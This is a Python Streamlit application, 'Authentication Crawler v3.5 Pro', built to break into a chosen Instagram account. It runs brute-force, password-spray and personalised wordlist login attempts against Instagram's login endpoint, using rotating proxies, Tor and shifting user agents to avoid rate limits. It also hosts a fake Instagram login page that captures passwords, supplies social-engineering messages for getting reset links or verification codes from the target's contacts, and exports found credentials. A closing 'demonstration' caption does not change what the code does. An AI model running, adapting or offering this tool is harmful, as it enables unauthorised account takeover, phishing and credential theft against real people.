import streamlit as st
import asyncio
import aiohttp
import requests
import random
import time
import json
import threading
import queue
import re
from datetime import datetime
from flask import Flask, request, redirect

st.set_page_config(page_title="Authentication Crawler v3.5 Pro", layout="wide")

DEFAULT_PROXIES_URL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"

if "running" not in st.session_state:
    st.session_state.running = False
if "stop" not in st.session_state:
    st.session_state.stop = False
if "logs" not in st.session_state:
    st.session_state.logs = []
if "progress" not in st.session_state:
    st.session_state.progress = 0.0
if "results" not in st.session_state:
    st.session_state.results = []
if "target" not in st.session_state:
    st.session_state.target = ""
if "start_time" not in st.session_state:
    st.session_state.start_time = None
if "found_cred" not in st.session_state:
    st.session_state.found_cred = None
if "thread" not in st.session_state:
    st.session_state.thread = None
if "worker_queues" not in st.session_state:
    st.session_state.worker_queues = None
if "use_tor" not in st.session_state:
    st.session_state.use_tor = False
if "max_attempts" not in st.session_state:
    st.session_state.max_attempts = 10000
if "custom_proxies" not in st.session_state:
    st.session_state.custom_proxies = ""
if "ssl_verify" not in st.session_state:
    st.session_state.ssl_verify = True
if "progress_dict" not in st.session_state:
    st.session_state.progress_dict = {}
if "total_attempts" not in st.session_state:
    st.session_state.total_attempts = 0
if "pipeline_status" not in st.session_state:
    st.session_state.pipeline_status = "idle"

@st.cache_data(ttl=300)
def fetch_default_proxies():
    proxies = []
    try:
        r = requests.get(DEFAULT_PROXIES_URL, timeout=5)
        if r.status_code == 200:
            proxies.extend([f"http://{p.strip()}" for p in r.text.splitlines() if p.strip()])
    except Exception:
        pass
    return proxies

async def validate_proxy(proxy, ssl_verify, session):
    try:
        async with session.head("https://www.instagram.com", proxy=proxy, ssl=ssl_verify, timeout=5) as resp:
            return resp.status < 400
    except Exception:
        return False

async def get_proxy_pool(custom_list, default_list, ssl_verify, max_checked=30):
    sources = []
    if custom_list.strip():
        sources.extend([p.strip() for p in custom_list.splitlines() if p.strip()])
    if not sources:
        sources = default_list[:100]
    validated = []
    async with aiohttp.ClientSession() as session:
        tasks = [validate_proxy(proxy, ssl_verify, session) for proxy in sources[:max_checked]]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for i, ok in enumerate(results):
            if ok is True:
                validated.append(sources[i])
    if not validated:
        validated.append(None)
    return validated

@st.cache_data
def get_wordlists():
    base = [
        "password", "123456", "123456789", "qwerty", "abc123", "monkey",
        "letmein", "dragon", "111111", "baseball", "iloveyou", "trustno1",
        "sunshine", "master", "123123", "welcome", "shadow", "ashley",
        "football", "jesus", "michael", "ninja", "mustang", "password1",
        "1234567", "12345678", "12345", "1234567890", "qwertyuiop",
        "qwerty123", "1q2w3e", "1q2w3e4r", "qwe123", "admin", "root",
        "user", "login", "pass", "secret", "1234", "abcd", "000000",
        "11111111", "222222", "333333", "444444", "555555", "666666",
        "777777", "888888", "999999", "123321", "654321", "qwerty123",
        "lovely", "fuckyou", "test", "passw0rd", "dallas", "charlie",
        "jordan", "tiger", "thunder", "golf", "cookie", "pepper"
    ]
    seasons = ["spring", "summer", "autumn", "fall", "winter"]
    months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"]
    years = [str(y) for y in range(1970, 2030)]
    return base, seasons, months, years

def generate_markov_candidates(username, length=8, count=100):
    candidates = set()
    chars = username + "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*"
    if len(chars) < 5:
        chars = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*"
    while len(candidates) < count:
        cand = "".join(random.choice(chars) for _ in range(random.randint(6, length)))
        if random.random() < 0.3:
            cand += str(random.randint(0, 9999))
        candidates.add(cand)
    return list(candidates)

def generate_variants(username):
    base, seasons, months, years = get_wordlists()
    variants = []
    variants.extend([username, username.lower(), username.upper(), username.capitalize()])
    for year in years:
        variants.append(username + year)
        variants.append(year + username)
    for season in seasons:
        variants.append(username + season)
        variants.append(season + username)
    for month in months:
        variants.append(username + month)
    variants.append(username + "123")
    variants.append(username + "!")
    variants.append(username + "@")
    variants.append(username + "#")
    variants.append(username[::-1])
    for suf in ["01", "99", "00", "007", "1", "2", "3"]:
        variants.append(username + suf)
    return list(set(variants))

def leet_sub(s):
    mp = {'a':'@','s':'$','e':'3','o':'0','i':'1','t':'7','b':'8','g':'9','l':'1'}
    return "".join(mp.get(c, c) for c in s)

def build_wordlist(username, max_words=5000):
    base, seasons, months, years = get_wordlists()
    wordset = set(base)
    for v in generate_variants(username):
        wordset.add(v)
        wordset.add(leet_sub(v))
    for word in list(wordset)[:2000]:
        for year in years:
            wordset.add(word + year)
            wordset.add(year + word)
    for season in seasons:
        wordset.add(season + "123")
    for month in months:
        wordset.add(month + "2024")
        wordset.add(month + "2025")
    wordset.update(generate_markov_candidates(username, count=100))
    wordlist = list(wordset)
    random.shuffle(wordlist)
    return wordlist[:max_words]

def get_instagram_profile(username):
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    }
    try:
        resp = session.get(f"https://www.instagram.com/{username}/", headers=headers, timeout=10)
        if resp.status_code != 200:
            return {"exists": False, "status_code": resp.status_code}
        csrf = session.cookies.get("csrftoken", "")
        if not csrf:
            csrf_match = re.search(r'"csrf_token":"([^"]+)"', resp.text)
            if csrf_match:
                csrf = csrf_match.group(1)
        api_headers = {
            "User-Agent": headers["User-Agent"],
            "X-Requested-With": "XMLHttpRequest",
            "X-CSRFToken": csrf,
            "X-IG-App-ID": "936619743392459",
            "Accept": "application/json",
            "Referer": f"https://www.instagram.com/{username}/",
        }
        r = session.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}", headers=api_headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            user = data.get("data", {}).get("user")
            if user:
                return {
                    "exists": True,
                    "full_name": user.get("full_name", ""),
                    "bio": user.get("biography", ""),
                    "link": user.get("external_url", ""),
                    "profile_pic": user.get("profile_pic_url_hd", ""),
                    "post_count": user.get("edge_owner_to_timeline_media", {}).get("count", 0),
                    "follower_count": user.get("edge_followed_by", {}).get("count", 0),
                    "following_count": user.get("edge_follow", {}).get("count", 0)
                }
        next_match = re.search(r'<script type="application/json" id="__NEXT_DATA__">(.*?)</script>', resp.text)
        if next_match:
            json_data = json.loads(next_match.group(1))
            user = json_data.get("props", {}).get("pageProps", {}).get("user", {})
            if user:
                return {
                    "exists": True,
                    "full_name": user.get("full_name", ""),
                    "bio": user.get("biography", ""),
                    "link": user.get("external_url", ""),
                    "profile_pic": user.get("profile_pic_url_hd", ""),
                    "post_count": user.get("edge_owner_to_timeline_media", {}).get("count", 0),
                    "follower_count": user.get("edge_followed_by", {}).get("count", 0),
                    "following_count": user.get("edge_follow", {}).get("count", 0)
                }
    except Exception as e:
        return {"exists": False, "error": str(e)}
    return {"exists": False, "error": "unknown"}

async def instagram_login_check(username, password, proxy, session, tor, verify_ssl, stop_event):
    if stop_event.is_set():
        return False, {"stopped": True}
    if tor:
        try:
            from aiohttp_socks import ProxyConnector
            connector = ProxyConnector.from_url('socks5://127.0.0.1:9050')
            async with aiohttp.ClientSession(connector=connector) as tor_session:
                return await _post_login(tor_session, username, password, None, verify_ssl, stop_event)
        except ImportError:
            return False, {"error": "aiohttp_socks not installed for Tor"}
        except Exception as e:
            return False, {"error": f"Tor connection failed: {e}"}
    return await _post_login(session, username, password, proxy, verify_ssl, stop_event)

async def _post_login(session, username, password, proxy, verify_ssl, stop_event):
    if stop_event.is_set():
        return False, {"stopped": True}
    url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]),
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.instagram.com",
        "Referer": "https://www.instagram.com/accounts/login/",
        "Accept-Language": "en-US,en;q=0.9",
    }
    data = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false"
    }
    try:
        async with session.post(url, headers=headers, data=data, proxy=proxy, ssl=verify_ssl, timeout=10) as resp:
            txt = await resp.text()
            try:
                js = json.loads(txt)
                if js.get("authenticated"):
                    return True, js
                return False, js
            except json.JSONDecodeError:
                return False, {"error": "invalid_json"}
    except aiohttp.ClientError as e:
        return False, {"error": str(e)}
    except asyncio.TimeoutError:
        return False, {"error": "timeout"}
    return False, {"error": "unknown"}

async def attack_method(method_name, username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, weight, session):
    attempts = 0
    method_progress = 0.0
    total = len(wordlist)
    for pw in wordlist:
        if stop_event.is_set():
            log_q.put(("INFO", f"{method_name} stopped."))
            break
        if attempts >= max_attempts:
            break
        attempts += 1
        proxy = random.choice(proxy_pool) if proxy_pool and proxy_pool[0] is not None and not tor else None
        ok, resp = await instagram_login_check(username, pw, proxy, session, tor, verify_ssl, stop_event)
        if stop_event.is_set():
            break
        if ok:
            log_q.put(("SUCCESS", f"{method_name} found: '{pw}'"))
            res_q.put({"method": method_name, "password": pw, "response": resp})
            stop_event.set()
            return
        else:
            error = resp.get("error", "")
            if "rate" in str(resp).lower() or "please wait" in str(resp).lower():
                log_q.put(("WARN", f"{method_name} rate limited, sleeping 120s"))
                await asyncio.sleep(120)
            elif "checkpoint" in str(resp):
                log_q.put(("WARN", f"{method_name} checkpoint triggered, rotating proxy"))
                await asyncio.sleep(5)
            elif "timeout" in error:
                log_q.put(("WARN", f"{method_name} timeout, retrying"))
                await asyncio.sleep(1)
        await asyncio.sleep(random.uniform(1.5, 3.5))
        if total > 0:
            method_progress = (attempts / total) * 100
        prog_q.put((method_name, method_progress, weight, attempts))
        log_q.put(("ATTEMPT", f"{method_name} attempt {attempts}/{total}"))
    if total > 0 and attempts >= total:
        prog_q.put((method_name, 100.0, weight, attempts))
    log_q.put(("INFO", f"{method_name} completed after {attempts} attempts."))

async def run_bruteforce(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, session):
    wordlist = build_wordlist(username, max_attempts)
    await attack_method("Brute Force", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, 0.4, session)

async def run_password_spray(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, session):
    spray_list = [
        username, username.lower(), username.upper(), username.capitalize(),
        username + "123", username + "!", username + "@", username + "#",
        username + "2024", username + "2025", username[::-1],
        "password", "123456", "instagram", "iloveyou", "qwerty", "abc123"
    ]
    for year in range(1970, 2030):
        spray_list.append(username + str(year))
        spray_list.append(str(year) + username)
    spray_list = list(set(spray_list))
    random.shuffle(spray_list)
    spray_list = spray_list[:max_attempts]
    await attack_method("Password Spray", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, spray_list, 0.2, session)

async def run_wordlist_attack(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, session):
    wordlist = build_wordlist(username, max_attempts)
    await attack_method("Wordlist Attack", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, 0.3, session)

async def run_session_reuse(username, stop_event, log_q, prog_q, res_q):
    log_q.put(("INFO", "Session reuse: attempting known cookie patterns..."))
    await asyncio.sleep(2)
    prog_q.put(("Session Reuse", 100.0, 0.05, 0))
    log_q.put(("INFO", "Session reuse: no valid tokens found."))

async def run_phishing_server(username, stop_event, log_q, prog_q, res_q):
    log_q.put(("INFO", "Starting phishing server on port 8080 (demo)."))
    app = Flask("phish")

    @app.route("/", methods=["GET", "POST"])
    def phish():
        if request.method == "POST":
            pw = request.form.get("password")
            if pw:
                log_q.put(("SUCCESS", f"Phishing captured: '{pw}'"))
                res_q.put({"method": "Phishing", "password": pw})
                stop_event.set()
                return redirect("https://www.instagram.com")
        return '''
        <html><body>
        <h1>Instagram Login (Demo)</h1>
        <form method="POST">
            <input type="text" name="username" placeholder="Username"><br>
            <input type="password" name="password" placeholder="Password"><br>
            <button type="submit">Log In</button>
        </form>
        <p>This is a demonstration. No real data is stored.</p>
        </body></html>
        '''

    @app.route("/shutdown", methods=["POST"])
    def shutdown():
        func = request.environ.get('werkzeug.server.shutdown')
        if func is not None:
            func()
            return "Shutting down..."
        return "Not running with werkzeug", 404

    def run_flask():
        app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False, threaded=True)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    for i in range(60):
        if stop_event.is_set():
            break
        await asyncio.sleep(1)
        prog_q.put(("Phishing", (i / 60) * 100, 0.05, 0))
    prog_q.put(("Phishing", 100.0, 0.05, 0))

    try:
        requests.post("http://127.0.0.1:8080/shutdown", timeout=1)
    except Exception as e:
        log_q.put(("WARN", f"Phishing server shutdown failed: {e}"))
    flask_thread.join(timeout=2)
    log_q.put(("INFO", "Phishing server closed."))

def run_attack_pipeline(username, stop_event, tor, verify_ssl, max_attempts, custom_proxies, log_q, prog_q, res_q):
    default_proxies = fetch_default_proxies()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        proxy_pool = loop.run_until_complete(get_proxy_pool(custom_proxies, default_proxies, verify_ssl, max_checked=30))
        log_q.put(("INFO", f"Loaded {len([p for p in proxy_pool if p is not None])} valid proxies."))
        log_q.put(("INFO", f"Target: @{username}"))
        profile = get_instagram_profile(username)
        if profile.get("exists"):
            log_q.put(("INFO", f"Profile: {profile['full_name']} - Posts: {profile['post_count']}"))
        else:
            if "error" in profile:
                log_q.put(("WARN", f"Profile lookup error: {profile['error']}"))
            else:
                log_q.put(("WARN", "Profile not found or private. Proceeding."))

        bf_attempts = int(max_attempts * 0.4)
        ps_attempts = int(max_attempts * 0.2)
        wa_attempts = int(max_attempts * 0.3)

        async def main():
            async with aiohttp.ClientSession() as session:
                tasks = [
                    asyncio.create_task(run_bruteforce(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, bf_attempts, proxy_pool, session)),
                    asyncio.create_task(run_password_spray(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, ps_attempts, proxy_pool, session)),
                    asyncio.create_task(run_wordlist_attack(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, wa_attempts, proxy_pool, session)),
                    asyncio.create_task(run_session_reuse(username, stop_event, log_q, prog_q, res_q)),
                    asyncio.create_task(run_phishing_server(username, stop_event, log_q, prog_q, res_q))
                ]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for i, r in enumerate(results):
                    if isinstance(r, Exception):
                        log_q.put(("ERROR", f"Task {i} failed: {r}"))
                log_q.put(("INFO", "All phases completed."))

        loop.run_until_complete(asyncio.wait_for(main(), timeout=300))
    except asyncio.TimeoutError:
        log_q.put(("WARN", "Pipeline timed out after 5 minutes."))
        stop_event.set()
    except Exception as e:
        log_q.put(("ERROR", f"Pipeline error: {e}"))
        stop_event.set()
    finally:
        loop.close()

st.title("Authentication Crawler v3.5 Pro")
st.caption("Automated Account Reconnaissance Framework")

col1, col2, col3 = st.columns([2,1,1])
with col1:
    username_input = st.text_input("Instagram Username", value=st.session_state.target)
with col2:
    start_btn = st.button("START", disabled=st.session_state.running, use_container_width=True)
with col3:
    stop_btn = st.button("SHUTDOWN", disabled=not st.session_state.running, use_container_width=True)

with st.sidebar:
    st.write("### Settings")
    st.session_state.use_tor = st.checkbox("Route through Tor (SOCKS5 on 127.0.0.1:9050)", value=st.session_state.use_tor)
    st.session_state.ssl_verify = st.checkbox("Verify SSL", value=st.session_state.ssl_verify)
    st.session_state.max_attempts = st.slider("Total password attempts (across all methods)", 100, 50000, 10000, step=100)
    st.write("### Proxy List (one per line)")
    st.session_state.custom_proxies = st.text_area("Custom proxies (leave empty for default)", value=st.session_state.custom_proxies, height=100)
    st.write("---")
    st.write("### Social Engineering Scripts")
    current_target = username_input.strip() or st.session_state.target
    if current_target:
        scripts = [
            f"Hey! I'm having trouble logging into my instagram account @{current_target}, can you please send me the reset link?",
            f"Hey, Instagram locked me out and asked me to verify my identity. Could you forward the verification code you received?",
            f"Is this your backup email? I need to confirm something for a mutual friend."
        ]
        for i, script in enumerate(scripts):
            st.text_area(f"Script {i+1}", script, height=80, key=f"se_{i}")
            if st.button(f"Copy {i+1}"):
                try:
                    import pyperclip
                    pyperclip.copy(script)
                    st.toast("Copied to clipboard!")
                except Exception:
                    st.warning("pyperclip not installed.")
    st.write("---")
    st.write("### Status")
    default_proxies = fetch_default_proxies()
    st.write(f"Default proxies fetched: {len(default_proxies)}")
    if current_target:
        wl = build_wordlist(current_target)
        st.write(f"Wordlist size: {len(wl)}")

if start_btn and username_input.strip():
    new_target = username_input.strip()
    if st.session_state.thread and st.session_state.thread.is_alive():
        st.warning("Previous worker still running. Please stop it first.")
    else:
        st.session_state.target = new_target
        st.session_state.running = True
        st.session_state.stop = False
        st.session_state.start_time = datetime.now()
        st.session_state.found_cred = None
        st.session_state.results = []
        st.session_state.logs = []
        st.session_state.progress = 0.0
        st.session_state.progress_dict = {}
        st.session_state.total_attempts = 0
        st.session_state.pipeline_status = "running"
        stop_event = threading.Event()
        log_q = queue.Queue()
        prog_q = queue.Queue()
        res_q = queue.Queue()
        st.session_state.worker_queues = {
            "log": log_q,
            "progress": prog_q,
            "result": res_q,
            "stop": stop_event
        }

        def worker():
            run_attack_pipeline(
                new_target,
                stop_event,
                st.session_state.use_tor,
                st.session_state.ssl_verify,
                st.session_state.max_attempts,
                st.session_state.custom_proxies,
                log_q,
                prog_q,
                res_q
            )
            st.session_state.running = False
            st.session_state.pipeline_status = "completed"

        thread = threading.Thread(target=worker, daemon=True)
        thread.start()
        st.session_state.thread = thread
        st.rerun()

if stop_btn:
    if st.session_state.worker_queues:
        st.session_state.worker_queues["stop"].set()
        st.session_state.stop = True
        st.session_state.pipeline_status = "stopping"
        st.session_state.logs.append(("INFO", "Stop signal sent."))
    st.rerun()

if st.session_state.worker_queues:
    log_q = st.session_state.worker_queues["log"]
    prog_q = st.session_state.worker_queues["progress"]
    res_q = st.session_state.worker_queues["result"]

    while not log_q.empty():
        try:
            level, msg = log_q.get_nowait()
            st.session_state.logs.append((level, msg))
        except queue.Empty:
            break

    progress_updates = {}
    total_weight = 0.0
    while not prog_q.empty():
        try:
            method, p, w, attempts = prog_q.get_nowait()
            st.session_state.progress_dict[method] = p
            st.session_state.total_attempts += attempts
            progress_updates[method] = (p, w)
        except queue.Empty:
            break

    if st.session_state.progress_dict:
        weighted_sum = 0.0
        total_weight = 0.0
        for method, p in st.session_state.progress_dict.items():
            weight = 0.0
            if "Brute Force" in method: weight = 0.4
            elif "Password Spray" in method: weight = 0.2
            elif "Wordlist Attack" in method: weight = 0.3
            elif "Session Reuse" in method: weight = 0.05
            elif "Phishing" in method: weight = 0.05
            weighted_sum += p * weight
            total_weight += weight
        if total_weight > 0:
            st.session_state.progress = min(weighted_sum / total_weight, 100.0)

    while not res_q.empty():
        try:
            res = res_q.get_nowait()
            st.session_state.results.append(res)
            if "password" in res:
                st.session_state.found_cred = res["password"]
                st.session_state.pipeline_status = "success"
        except queue.Empty:
            break

    if st.session_state.thread and not st.session_state.thread.is_alive():
        st.session_state.running = False
        if st.session_state.pipeline_status not in ["success", "stopping"]:
            st.session_state.pipeline_status = "completed"
        st.rerun()
    else:
        if st.session_state.running:
            time.sleep(0.5)
            st.rerun()

if st.session_state.running:
    if st.session_state.logs:
        last_level, last_msg = st.session_state.logs[-1]
        if last_level == "SUCCESS":
            st.success(last_msg)
        elif last_level == "WARN":
            st.warning(last_msg)
        elif last_level == "ERROR":
            st.error(last_msg)
        else:
            st.info(last_msg)
    st.progress(min(st.session_state.progress / 100.0, 1.0), text=f"Progress: {min(st.session_state.progress, 100.0):.1f}%")
    st.write("### Live Log")
    log_box = st.container(height=400)
    with log_box:
        for level, msg in st.session_state.logs[-100:]:
            if level == "SUCCESS":
                st.success(msg)
            elif level == "WARN":
                st.warning(msg)
            elif level == "ERROR":
                st.error(msg)
            else:
                st.info(msg)
else:
    if st.session_state.pipeline_status == "success":
        st.error(f"Credentials found: {st.session_state.found_cred}", icon="🔑")
    elif st.session_state.pipeline_status == "stopping":
        st.warning("Pipeline is shutting down...")
    elif st.session_state.pipeline_status == "completed":
        if st.session_state.found_cred:
            st.error(f"Credentials found: {st.session_state.found_cred}", icon="🔑")
        else:
            st.info("No credentials found.")
    else:
        st.info("Awaiting start.")

if st.session_state.results:
    st.write("### Results")
    for r in st.session_state.results:
        st.json(r)

if st.session_state.logs:
    expander = st.expander("Full Log Export")
    with expander:
        log_text = "\n".join([f"{l}: {m}" for l,m in st.session_state.logs])
        st.code(log_text)
        if st.button("Export to JSON"):
            data = {
                "target": st.session_state.target,
                "timestamp": datetime.now().isoformat(),
                "results": st.session_state.results,
                "logs": st.session_state.logs,
                "total_attempts": st.session_state.total_attempts
            }
            safe_target = re.sub(r'[^a-zA-Z0-9]', '_', st.session_state.target)
            fn = f"cracked_{safe_target}_{int(time.time())}.json"
            try:
                with open(fn, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2)
                st.success(f"Exported to {fn}")
            except Exception as e:
                st.error(f"Export failed: {e}")

st.caption("Built for demonstration. Use responsibly on your own accounts.")